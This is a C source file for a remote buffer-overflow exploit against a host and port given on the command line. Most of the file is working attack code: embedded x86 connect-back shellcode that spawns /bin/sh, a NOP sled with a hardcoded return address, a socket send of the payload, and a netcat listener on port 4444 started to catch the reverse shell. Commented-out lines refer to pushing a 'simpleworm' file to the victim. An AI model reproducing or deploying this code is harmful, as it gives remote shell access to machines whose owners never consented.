#include #include #include #include #define BUF_SIZE 1064
#define BUF_SIZE_02 1064
char shellcode[] =
"\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
"\x06\x51\xb1\x01\x51\xb1\x02\x51"
"\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
"\x89\xc2\x31\xc0\x31\xc9\x51\x51"
"\x68\x41\x42\x43\x44\x66\x68\xb0"
"\xef\xb1\x02\x66\x51\x89\xe7\xb3"
"\x10\x53\x57\x52\x89\xe1\xb3\x03"
"\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
"\x74\x06\x31\xc0\xb0\x01\xcd\x80"
"\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
"\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
"\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
"\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
"\x50\x68\x6e\x2f\x73\x68\x68\x2f"
"\x2f\x62\x69\x89\xe3\x50\x53\x89"
"\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
"\x01\xcd\x80";


//standard offset (probably must be modified)
#define RET 0xbfffebff

int main(int argc, char *argv[]) {
system("gnome-terminal --command=\"bash -c 'echo \"hello\";nc -l 4444;read line$SHELL'\"");
sleep(5);
char buffer[BUF_SIZE];
int s, i, size;
struct sockaddr_in remote;
struct hostent *host;

if(argc != 3) {
printf("Usage: %s target-ip port \n", argv[0]);
return -1;
}
// filling buffer with NOPs
memset(buffer, 0x90, BUF_SIZE);

//Modify the connectback ip address and port. In this case, the shellcode connects to 192.168.2.101 on port 17*256+92=4444
shellcode[33] = 192;
shellcode[34] = 168;
shellcode[35] = 248;
shellcode[36] = 130;

shellcode[39] = 17;
shellcode[40] = 92;
//copying shellcode into buffer
memcpy(buffer+900-sizeof(shellcode) , shellcode, sizeof(shellcode)-1);


// Copying the return address multiple times at the end of the buffer...
for(i=901; i < BUF_SIZE-4; i+=4) {
* ((int *) &buffer[i]) = RET;
}
buffer[BUF_SIZE-1] = 0x0;
//getting hostname
host=gethostbyname(argv[1]);
if (host==NULL)
{
fprintf(stderr, "Unknown Host %s\n",argv[1]);
return -1;
}
// creating socket...
s = socket(AF_INET, SOCK_STREAM, 0);
if (s < 0)
{
fprintf(stderr, "Error: Socket\n");
return -1;
}
//state Protocolfamily , then converting the hostname or IP address, and getting port number
remote.sin_family = AF_INET;
remote.sin_addr = *((struct in_addr *)host->h_addr);
remote.sin_port = htons(atoi(argv[2]));
// connecting with destination host
if (connect(s, (struct sockaddr *)&remote, sizeof(remote))==-1)
{
close(s);
fprintf(stderr, "Error: connect\n");
return -1;
}
//sending exploit string
size = send(s, buffer, sizeof(buffer), 0);
if (size==-1)
{
close(s);
fprintf(stderr, "sending data failed\n");
return -1;
}
/*system("gnome-terminal -x sh -c 'nc -l 4444;exec bash'");*/
//system("gnome-terminal --command=\"bash -c 'ls;nc -l 4444;>simpleworm$SHELL'\"");
system("ls");
/*"memcpy(buffer, "nc -l 4444>simpleworm\x0A",24);
size=send(s, buffer, 24,0);*/
// closing socket
close(s);
}
